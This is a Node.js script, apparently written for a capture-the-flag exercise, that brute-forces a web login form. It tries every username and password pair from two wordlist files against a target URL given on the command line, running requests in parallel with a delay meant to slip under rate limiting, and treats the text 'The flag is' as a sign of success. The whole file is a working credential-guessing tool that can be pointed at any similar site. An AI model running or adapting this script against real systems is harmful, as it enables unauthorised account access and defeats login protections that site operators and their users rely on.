const fs = require('fs');
const axios = require('axios');
const { promisify } = require('util');
const sleep = promisify(setTimeout);

// Configure these for your target
const LOGIN_FAIL_INDICATOR = "The flag is"; // Text shown on failed login
const REQUEST_DELAY_MS = 50; // Delay between attempts (avoid rate limiting)
const MAX_CONCURRENT_REQUESTS = 3; // Parallel requests

async function testCredentials(url, username, password) {
    try {
        const payload = {
            username: username,
            password: password,
            login: 'submit'
        };

        const response = await axios.get(`${url}?page=signin&username=${username}&password=${password}&Login=Login#`);

        // console.log("response", response)
        if (response.data.includes(LOGIN_FAIL_INDICATOR)) {
            console.log(`[SUCCESS] ${username}:${password}`);
            return true;
        } else {
            console.log(`[FAILURE] ${username}:${password}`);
            return false;
        }
    } catch (error) {
        console.error(`[ERROR] ${username}:${password} - ${error.message}`);
    }
    return false;
}

async function processFiles(targetUrl, usersFile, passwordsFile) {
    const users = fs.readFileSync(usersFile, 'utf8').split('\n').filter(u => u.trim());
    const passwords = fs.readFileSync(passwordsFile, 'utf8').split('\n').filter(p => p.trim());

    console.log(users, passwords)

    const queue = [];
    for (const user of users) {
        for (const password of passwords) {
            queue.push({ user, password });
        }
    }

    // Process with concurrency control
    const worker = async () => {
        while (queue.length > 0) {
            const { user, password } = queue.pop();
            await testCredentials(targetUrl, user, password);
            await sleep(REQUEST_DELAY_MS);
        }
    };

    // await testCredentials(targetUrl, "me", "shadow");
    // await sleep(REQUEST_DELAY_MS);
    // await testCredentials(targetUrl, "me", "test");
    // await sleep(REQUEST_DELAY_MS);

    await Promise.all(
        Array(Math.min(MAX_CONCURRENT_REQUESTS, queue.length))
            .fill()
            .map(worker)
    );
}

// Main execution
if (process.argv.length !== 5) {
    console.log("Usage: node login_tester.js <target_url> <users_file> <passwords_file>");
    process.exit(1);
}

const [, , targetUrl, usersFile, passwordsFile] = process.argv;
processFiles(targetUrl, usersFile, passwordsFile).catch(console.error);